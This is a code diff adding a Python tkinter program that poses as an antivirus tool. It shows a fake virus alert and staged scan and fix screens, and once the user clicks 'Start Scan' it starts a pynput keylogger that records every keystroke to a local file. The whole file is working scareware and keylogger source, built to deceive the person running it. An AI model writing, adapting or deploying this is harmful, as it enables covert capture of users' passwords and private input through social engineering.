@@ -1,0 +1,142 @@
+import tkinter as tk
+from tkinter import messagebox
+import time
+import threading
+from pynput import keyboard
+
+# File to store logged keys
+key_log_file = "key_log.txt"
+listener = None  # Variable to hold the listener instance
+
+# Function to log keys
+def on_press(key):
+    try:
+        with open(key_log_file, "a") as f:
+            if hasattr(key, 'char'):
+                f.write(f"{key.char}")  # Append character to the file
+            else:
+                f.write(f" {key} ")  # Append special key to the file
+    except Exception as e:
+        print(f"Error logging key: {e}")
+
+# Function to start the keylogger
+def start_keylogger():
+    global listener
+    listener = keyboard.Listener(on_press=on_press)
+    listener.start()  # Start the listener
+
+# Function to stop the keylogger
+def stop_keylogger():
+    global listener
+    if listener:
+        listener.stop()  # Stop the listener
+        listener.join()  # Wait for the listener thread to finish
+
+# Function to handle keyboard events (to stop the keylogger with ESC key)
+def on_escape_press(key):
+    if key == keyboard.Key.esc:
+        stop_keylogger()  # Stop the keylogger
+        print("Keylogger stopped.")  # Optional: Print message for confirmation
+
+# Function to simulate the fake virus alert
+def show_fake_alert():
+    messagebox.showwarning("Alert!", "Virus detected on your system!\nPlease start the scan immediately.")
+    root.after(500, start_fake_antivirus)
+
+# Function to simulate the fake antivirus scanning process
+def fake_scan():
+    scan_button.config(state=tk.DISABLED, bg="#b3b3b3")
+    progress_label.config(text="Scan in progress...")
+
+    for i in range(101):
+        progress_var.set(i)
+        progress_canvas.coords(progress_rect, 0, 0, 3 * i, 30)
+        root.update_idletasks()
+        time.sleep(0.1)
+
+    progress_label.config(text="Scan Complete!")
+    show_fake_results()
+
+def show_fake_results():
+    messagebox.showwarning("Warning!", "3 viruses detected!\nClick 'Fix' to remove.")
+    fix_button.config(state=tk.NORMAL, bg="#ff4d4d")
+
+def fake_fix():
+    progress_label.config(text="Fixing issues...")
+
+    for i in range(101):
+        progress_var.set(i)
+        progress_canvas.coords(progress_rect, 0, 0, 3 * i, 30)
+        root.update_idletasks()
+        time.sleep(0.15)
+
+    root.update_idletasks()
+    time.sleep(1)
+
+    show_logged_keys()
+    messagebox.showinfo("Success", "Viruses removed successfully!")
+    fix_button.config(state=tk.DISABLED, bg="#b3b3b3")
+    scan_button.config(state=tk.NORMAL, bg="#4CAF50")
+
+def show_logged_keys():
+    try:
+        with open(key_log_file, "r") as f:
+            keys = f.read()
+        messagebox.showinfo("Logged Keys", keys)
+    except FileNotFoundError:
+        messagebox.showinfo("Logged Keys", "No keys logged.")
+
+# Function to run the fake scan in a thread
+def start_fake_scan():
+    start_keylogger()  # Start logging keys when the scan begins
+    threading.Thread(target=fake_scan).start()
+
+# Function to start the fake antivirus GUI after the pop-up
+def start_fake_antivirus():
+    global root, scan_button, progress_canvas, progress_var, progress_label, progress_rect, fix_button
+
+    root = tk.Tk()
+    root.title("System Protection Scan")
+    root.geometry("400x250")
+    root.config(bg="#333333")
+
+    # Title Label
+    title_label = tk.Label(root, text="System Scan in Progress", font=("Helvetica", 16, "bold"), bg="#333333", fg="#FFFFFF")
+    title_label.pack(pady=10)
+
+    # Scan button
+    scan_button = tk.Button(root, text="Start Scan", command=start_fake_scan, font=("Helvetica", 12), bg="#ff4d4d", fg="white")
+    scan_button.pack(pady=10)
+
+    # Create a custom progress bar using Canvas
+    progress_canvas = tk.Canvas(root, width=300, height=30, bg="white")
+    progress_rect = progress_canvas.create_rectangle(0, 0, 0, 30, fill="#ff4d4d")
+    progress_canvas.pack(pady=10)
+
+    # Progress bar value (hidden, used for logic)
+    progress_var = tk.IntVar()
+
+    # Label to show scan status
+    progress_label = tk.Label(root, text="Click 'Start Scan' to begin", font=("Helvetica", 12), bg="#333333", fg="#FFFFFF")
+    progress_label.pack(pady=10)
+
+    # Fix button (initially disabled)
+    fix_button = tk.Button(root, text="Fix Detected Issues", state=tk.DISABLED, font=("Helvetica", 12), bg="#b3b3b3", fg="white", command=fake_fix)
+    fix_button.pack(pady=10)
+
+    # Start the listener for the ESC key
+    esc_listener = keyboard.Listener(on_press=on_escape_press)
+    esc_listener.start()  # Start listening for ESC key press
+
+    # Start the GUI loop
+    root.mainloop()
+
+# Main program starts here
+root = tk.Tk()
+root.withdraw()
+
+# Show the fake alert after a short delay
+root.after(2000, show_fake_alert)
+
+# Run the Tkinter main event loop
+root.mainloop()
